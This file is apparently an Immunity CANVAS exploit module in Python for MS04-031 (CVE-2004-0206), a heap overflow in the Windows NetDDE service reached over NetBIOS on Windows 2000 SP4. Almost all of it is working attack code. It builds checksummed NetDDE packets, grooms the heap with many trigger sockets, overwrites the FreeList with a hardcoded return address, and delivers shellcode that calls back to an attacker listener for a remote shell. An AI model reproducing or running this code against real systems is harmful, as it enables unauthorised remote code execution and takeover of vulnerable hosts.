#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation



import os
import getopt
import sys
import socket
import time

sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("../../libs")
sys.path.append("./libs")
sys.path.append("./exploits/osdetect")
sys.path.append("../../exploits/osdetect")
sys.path.append("./MOSDEF")
sys.path.append("../../MOSDEF")

from exploitutils import *
import addencoder
import chunkedaddencoder
import win32shell
from tcpexploit import tcpexploit
from msrpc import *
import mosdef, struct
import shellcodeGenerator
import canvasengine
from canvasengine import socket_save_list
import timeoutsocket
import msrpc

# GUI info
NAME="NETDDE through Netbios (MS04-031)"
DESCRIPTION="NETDDE.EXE Exploit through NetBIOS"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2004-0206"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0206"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["References"] = ""
DOCUMENTATION["MSRC"] = "http://www.microsoft.com/technet/security/Bulletin/MS04-031.mspx"

VERSION="0.1"

#affectsList=["Windows"]
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ] 
PROPERTY['MSADV'] = "MS04-031"

GTK2_DIALOG="dialog.glade2"

CHANGELOG="""

"""

NOTES="""
for debuging porpouse, you can start netdde from command line:
     net start netdde
and attach to netdde.exe
"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

targets = {
    0 : ["Autoversioning", 0,0],
    1 : ["Windows 2000 SP4", 0, 0x7799E588],
          }

# define these according to targets

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.covertness = 0
        self.port = 139
        self.host = "192.168.0.6"
        self.localhost = "192.168.1.2"
        self.localport = 5555
        self.version = 0
        self.badstring = "\0"
        self.searchbadstring="\0"
               
        #self.listenerArgsDict["fromcreatethread"]=1
        self.myDCE = None
        self.name=NAME
        return
   
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.localhost=host
        self.localport=port
        
        rawshellcode = self.createHeapSafeInject("", host, port)                                                                        
        self.log("Creating shellcode for version %s"%self.version)
        self.log("Calling back to %s:%s"%(host,port))                                                                               
        self.createWin32SearchShellcode(host, port, rawshellcode)                               
        self.log("length of real shellcode: %d"%(len(self.shellcode)))
        return self.shellcode
                                                                                         
        #return 1

    def test(self):
        return 0     

    def checksum(self, data):
        chk=0xffffffffL
        dlen = len(data)
        blen  = dlen -4
        for a in range(0, blen, 4):
            chk+= struct.unpack("L", data[a:a+4])[0]
            
        a+=4
        while a < dlen:
            chk+=ord(data[a])
            a+=1    
        
        return chk&0xFFFFFFFFL       

    def Overwrite_begin(self, s):

        #s=self.gettcpsock()
        s.connect((self.host, self.port))
        
        msrpc.NetDDE_Session(s, self.mtarget, self.starget)
        
        # First Packet
        main="\xbe\x05\x0a\x00\x00\x00\x0c\x00"\
           "\x15\x00\x08\x00"+ self.starget+"\x00"+\
            self.mtarget +"\x00\x43\x4f\x52\x45\x31\x2e\x30\x00\x00"

        packet_len=len(main) # size of the main part of the packet

        # both sizes are used to copy info to an allocated buffer
        hdr = "\x45\x44\x44\x4e\x00\x00\x00\x00"+struct.pack("H", packet_len) + "\x00\x00"
        hdr+= "\x00\x00\x00\x00\x00\x00\x00\x00"+struct.pack("H", packet_len) 
        hdr+= "\x00\x02\x02\x00\x00\x00\x01\x00\x00\x00" 

        # This size filed is passed to RtlAllocateHeap()
        main = struct.pack("H", packet_len) + main
        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main

        s.send(msrpc.netbios(buf))
        s.recv(1000)

        # Second Packet
        main = "\x00\x00\x00\x00\x00\x00\x00\x00"\
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xc8\xe8\x07"\
             "\x00\x64\x00\x28\x00\x34\x00\x3d\x00\xec\x01\x5f\x00"+\
             self.starget+ "\x00"+self.mtarget+"\x00\x00"

        packet_len=len(main)+2
        hdr = "\x45\x44\x44\x4e" +"\x00\x00\x00\x00" + struct.pack("H", packet_len)
        hdr+="\x00\x00\x01\x00\x00\x00\x01" +"\x00\x00\x00"+ struct.pack("H", packet_len)
        hdr+="\x02\x02\x01\x00\x00\x00\x02\x00\x00\x00"

        main = struct.pack("H", packet_len) + main
        
        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main
        
        s.send(msrpc.netbios(buf))
        ret=s.recv(1000)
        
    def Overwrite_run(self, s):
        
        #addr=struct.unpack("L", ret[0x7C:0x80])[0] 
        #print hex(addr)                       

        #hdr= "\x45\x44\x44\x4e\x00\x00\x00\x00\xD3\x00\x00\x00"
        #hdr+="\x02\x00\x00\x00\x02\x00\x00\x00\xD3\x00\x02\x02\x01\x00\x00\x00"\
           #"\x03\x00\x00\x00"  
        #main=  "\x88\x03\x00\x00\x00\x00\x00\x00"\
            #"\x00\x00\x00\x00\x00\x00\x00\x00"+ struct.pack("L",0x70123) +"\x04\x00\x00\x00"\
            #"\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0\xe7\x07\x00"\
            #"\x40\x00\x4c\x00\x53\x00\x5c\x00\x62\x00\x69\x00\x00\x00\x00\x00"\
            #"\x00\x00\x00\x00\x2a\x00\x00\x00"+ struct.pack("L", 0x70608)+struct.pack("L", 0x7C518A1C)+\
            #"\x53\x50\x30\x00\x55\x53\x45\x52\xCC\x32\x00\x57\x49\x4e\x32\x4b"\
            #"\x53\x52\x56\x00\x4e\x44\x44\x45\x24\x00\x43\x4c\x50\x42\x4b\x24"\
            #"\x00\x10\x00\x0d\x00\x1e\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00"\
            #"\x00\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x00\x00"\
            #"\x00\x00\x00\x4b\x53\x52\x56\x53\x50\x30\x00" 
        shell=""
        for a in range(0xb4, 0xff+1):
            shell+= chr(a)
            
        main=  "\x88\x03\x00\x00\x00\x00\x00\x00"\
            "\x00\x00\x00\x00\x00\x00\x00\x00"+ struct.pack("L",0x70123) +"\x04\x00\x00\x00"\
            "\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0\xe7\x07\x00"\
            "\x40\x00\x4c\x00\x53\x00\x5c\x00\x41\x41\x41\x41\x00\x00\x00\x00"\
            "\x41\x41\x41\x41\x41\x41\x41\x41" + struct.pack("L", 0x170608)+struct.pack("L", 0x7799E588)+\
            "\x53\x50\x30\x00\x55\x53\x45\x52"+self.encodedsearchcode 

        print hex(len(self.shellcode))
        for a in hexdump(self.shellcode):
            print a
            
        hdr= "\x45\x44\x44\x4e\x00\x00\x00\x00"+struct.pack("H", len(main))+"\x00\x00"
        hdr+="\x02\x00\x00\x00\x02\x00\x00\x00"+struct.pack("H", len(main))+"\x02\x02\x01\x00\x00\x00"\
           "\x03\x00\x00\x00"  

        #main= main + "A"*(0xd3 -len(main))
        #print hex(len(main))
        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main
        
        s.send(msrpc.netbios(buf))
        ret= s.recv(1000)
        
        
    def Trigger_begging(self, s):
        s.connect((self.host, self.port))
        msrpc.NetDDE_Session(s, self.mtarget, self.starget)
        
        # First Packet
        main="\xbe\x05\x0a\x00\x00\x00\x0c\x00"\
           "\x15\x00\x08\x00"+ self.starget+"\x00"+\
            self.mtarget +"\x00\x43\x4f\x52\x45\x31\x2e\x30\x00\x00"

        packet_len=len(main) # size of the main part of the packet

        # both sizes are used to copy info to an allocated buffer
        hdr = "\x45\x44\x44\x4e\x00\x00\x00\x00"+struct.pack("H", packet_len) + "\x00\x00"
        hdr+= "\x00\x00\x00\x00\x00\x00\x00\x00"+struct.pack("H", packet_len) 
        hdr+= "\x00\x02\x02\x00\x00\x00\x01\x00\x00\x00" 

        # This size filed is passed to RtlAllocateHeap()
        main = struct.pack("H", packet_len) + main
        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main

        s.send(msrpc.netbios(buf))
        s.recv(1000)

        # Second Packet
        main = "\x00\x00\x00\x00\x00\x00\x00\x00"\
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xc8\xe8\x07"\
             "\x00\x64\x00\x28\x00\x34\x00\x3d\x00\xec\x01\x5f\x00"+\
             self.starget+ "\x00"+self.mtarget+"\x00\x00"

        packet_len=len(main)+2
        hdr = "\x45\x44\x44\x4e" +"\x00\x00\x00\x00" + struct.pack("H", packet_len)
        hdr+="\x00\x00\x01\x00\x00\x00\x01" +"\x00\x00\x00"+ struct.pack("H", packet_len)
        hdr+="\x02\x02\x01\x00\x00\x00\x02\x00\x00\x00"

        main = struct.pack("H", packet_len) + main
        
        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main
        
        s.send(msrpc.netbios(buf))
        s.recv(1000)


    def Trigger_run(self, s):
        
        # (A) Size field, that is passed raw to RtlAllocateHeap (2 bytes)
        # 
        #      <   (A)  >
        main=  "\x50\x0D\x00\x00\x00\x00\x00\x00"\
            "\x00\x00\x00\x00\x00\x00\x00\x00"+ struct.pack("L",0x70123) +"\x04\x00\x00\x00"\
            "\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0\xe7\x07\x00"\
            "\x40\x00\x4c\x00\x53\x00\x5c\x00\x62\x00\x69\x00\x00\x00\x00\x00"\
            "\x00\x00\x00\x00\x2a\x00\x00\x00\x57\x49\x4e\x32\x4b\x53\x52\x56"\
            "\x53\x50\x30\x00\x55\x53\x45\x52\x33\x32\x00\x57\x49\x4e\x32\x4b"\
            "\x53\x52\x56\x00\x4e\x44\x44\x45\x24\x00\x43\x4c\x50\x42\x4b\x24"\
            "\x00\x10\x00\x0d\x00\x1e\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00"\
            "\x00\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x00\x57"\
            "\x49\x4e\x32\x4b\x53\x52\x56\x53\x50\x30\x00"+self.shellcode

        hdr= "\x45\x44\x44\x4e\x00\x00\x00\x00"+struct.pack("H", len(main))+"\x00\x00"
        hdr+="\x02\x00\x00\x00\x02\x00\x00\x00"+struct.pack("H", len(main))+"\x02\x02\x01\x00\x00\x00"\
            "\x03\x00\x00\x00"  

        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main
        
        s.send(msrpc.netbios(buf))
        ret=s.recv(1000)

        
        
    def Exploit_run(self):
        s=self.gettcpsock()
        s.connect((self.host, self.port))
        msrpc.NetDDE_Session(s, self.mtarget, self.starget)
        
        # First Packet
        #buf="\xf1\x45\x44\x50\x45\x44\x44\x4e\x00\x00\x00\x00\x2c\x00\x00\x00"\
        #    "\x00\x00\x00\x00\x00\x00\x00\x00\x2c\x00\x00\x02\x02\x00\x00\x00
        #    "\x01\x00\x00\x00\x3b\x64\xb0\x03\x01\x00\xbe\x05\x0a\x00\x00\x00"
        #    "\x0c\x00\x15\x00\x08\x00\x57\x49\x4e\x32\x4b\x53\x52\x56\x53\x50
        #    "\x30\x00\x57\x49\x4e\x32\x4b\x53\x52\x56\x00\x43\x4f\x52\x45\x31
        #    "\x2e\x30\x00\x00"

        main="\x01\x00\xbe\x05\x0a\x00\x00\x00\x0c\x00"\
           "\x15\x00\x08\x00"+ self.starget+"\x00"+\
            self.mtarget +"\x00\x43\x4f\x52\x45\x31\x2e\x30\x00\x00"

        packet_len=len(main) # size of the main part of the packet

        
        # both sizes are used to copy info to an allocated buffer
        hdr = "\x45\x44\x44\x4e\x00\x00\x00\x00"+struct.pack("H", packet_len) + "\x00\x00"
        hdr+= "\x00\x00\x00\x00\x00\x00\x00\x00"+struct.pack("H", packet_len) 
        hdr+= "\x00\x02\x02\x00\x00\x00\x01\x00\x00\x00" 

        # This size filed is passed to RtlAllocateHeap()
        #main = struct.pack("H", packet_len) + main
        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main
            
        s.send(msrpc.netbios(buf))
        s.recv(1000)

        # Second Packet
        main = "\x00\x00\x00\x00\x00\x00\x00\x00"\
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xc8\xe8\x07"\
             "\x00\x64\x00\x28\x00\x34\x00\x3d\x00\xec\x01\x5f\x00"+\
             self.starget+ "\x00"+self.mtarget+"\x00\x00"

        packet_len=len(main)+2
        hdr = "\x45\x44\x44\x4e" +"\x00\x00\x00\x00" + struct.pack("H", packet_len)
        hdr+="\x00\x00\x01\x00\x00\x00\x01" +"\x00\x00\x00"+ struct.pack("H", packet_len)
        hdr+="\x02\x02\x01\x00\x00\x00\x02\x00\x00\x00"

        main = struct.pack("H", packet_len) + main
        
        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main
        for a in hexdump(buf):
            print a
        
        s.send(msrpc.netbios(buf))
        s.recv(1000)
        
        
        ################################
        #msrpc.NetDDE_Session(s,self.mtarget, "WIN2KSRVCNV")
        #buf="\xf1\x45\x44\x50\x45\x44\x44\x4e\x00\x00\x00\x00\x2c\x00\x00\x00"\
        #"\x00\x00\x00\x00\x00\x00\x00\x00\x2c\x00\x00\x02\x02\x00\x00\x00\x01"\
        #"\x00\x00\x00\x3b\x64\xb0\x03\x01\x00\xbe\x05\x0a\x00\x00\x00\x0c\x00"\
        #"\x15\x00\x08\x00\x57\x49\x4e\x32\x4b\x53\x52\x56\x53\x50\x30\x00\x57"\
        #"\x49\x4e\x32\x4b\x53\x52\x56\x00\x43\x4f\x52\x45\x31\x2e\x30\x00\x00"
        #s.send(msrpc.netbios(buf))
        #s.recv(1000)

        ## <#1> if ==2, integrity check with the checksum 
        ##     checksum        #    magic         #   zeros       #     len_hi
        ## "\xaa\x45\x46\x50"
        ##checksum
        
        ## hdr +0xz        
        #main = "\x3e\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
           #"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xc8\xe8\x07"\
           #"\x00\x64\x00\x28\x00\x34\x00\x3d\x00\xec\x01\x5f\x00\x57\x49\x4e\x32"\
           #"\x4b\x53\x52\x56\x53\x50\x30\x00\x57\x49\x4e\x32\x4b\x53\x52\x56\x00"\
           #"\x00"

        #hdr = "\x45\x44\x44\x4e" +"\x00\x00\x00\x00"+struct.pack("H", len(main))
        ##     function_n     function_n                        len_hi        
        #hdr+="\x00\x00\x01\x00\x00\x00\x01" +"\x00\x00\x00" +struct.pack("H", len(main))
        ##         <#1>
        #hdr+="\x02\x02\x01\x00\x00\x00\x02\x00\x00\x00"
        
        #buf = hdr + struct.pack("L", self.checksum(main))
        #buf = struct.pack("L", self.checksum(buf)) + buf + main

        #s.send(msrpc.netbios(buf))
        #ret=s.recv(1000)
        ########################################

        hdr= "\x45\x44\x44\x4e\x00\x00\x00\x00\x93\x00\x00\x00"
        hdr+="\x02\x00\x00\x00\x02\x00\x00\x00\x93\x00\x02\x02\x01\x00\x00\x00"\
            "\x03\x00\x00\x00"  
        # 0x70123-4)
        main=  "\x93\x00\x00\x00\x00\x00\x00\x00"\
            "\x00\x00\x00\x00\x00\x00\x00\x00"+ struct.pack("L",0x70123) +"\x04\x00\x00\x00"\
            "\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0\xe7\x07\x00"\
            "\x40\x00\x4c\x00\x53\x00\x5c\x00\x62\x00\x69\x00\x00\x00\x00\x00"\
            "\x00\x00\x00\x00\x2a\x00\x00\x00\x57\x49\x4e\x32\x4b\x53\x52\x56"\
            "\x53\x50\x30\x00\x55\x53\x45\x52\x33\x32\x00\x57\x49\x4e\x32\x4b"\
            "\x53\x52\x56\x00\x4e\x44\x44\x45\x24\x00\x43\x4c\x50\x42\x4b\x24"\
            "\x00\x10\x00\x0d\x00\x1e\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00"\
            "\x00\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x00\x57"\
            "\x49\x4e\x32\x4b\x53\x52\x56\x53\x50\x30\x00"

        buf = hdr + struct.pack("L", self.checksum(main))
        buf = struct.pack("L", self.checksum(buf)) + buf + main
        
        s.send(msrpc.netbios(buf))
        ret=s.recv(1000)
        return s
    
    def Win2k(self):
        socketlist=[]
        self.log("[*] Setting the Trigger sockets")

        d=self.gettcpsock()
        e=self.gettcpsock()

        for a in range(0, 9):
            s=self.gettcpsock()
            self.Trigger_begging(s)
            socketlist.append(s)
            
        self.log("[*] Setting the Overwrite sockets")
        self.Overwrite_begin(d)
        self.Overwrite_begin(e)
        self.log("[*] Exploiting the bug (inc [FreeListInUse])")        
        d=self.Exploit_run()
        
        self.log("[*] Overwriting the FreeList")        
        self.Overwrite_run(d)
        self.Overwrite_run(e)

        self.log("[*] Memleaking to trigger CommitRoutine")                
        
        try:       
            for s in socketlist:
                self.Trigger_run(s)
        except timeoutsocket.Timeout:
            pass
        
    def getmtarget(self):
        smbobj=SMB(self.host,port=self.port,getsock=self)
        smbobj.covertness=self.covertness
        smbobj.username=self.user
        smbobj.password=self.password
        ret=smbobj.connect()
        server=smbobj.server
        smbobj.close()
        time.sleep(1)
        self.log("smbobj.server=%s"%prettyprint(server))
        return server
   
    def run(self):
        self.host=self.target.interface
        #self.mtarget="WIN2KSRV"
        #self.mtarget="WIN2KSRV"
        self.starget="WIN2KSRVSP0"
        self.setInfo("%s attacking %s:%d - (in progress)"% (NAME, self.host, self.port), showlog=True)

        self.info, self.align, self.retadd = targets[self.version]
        # connect 
        self.mtarget=self.getmtarget()

        if self.mtarget==None:
            self.log("No SMB server detected")
            self.setInfo("%s attacking %s:%d - (failed: no connection)"% (NAME, self.host, self.port), showlog=True)
            return 0
        
        time.sleep(1)
        self.Win2k()
        
        time.sleep(20)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port), showlog=True)
            return 1
            
        self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port), 
                     showlog=True)
        return 0

    
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)


    
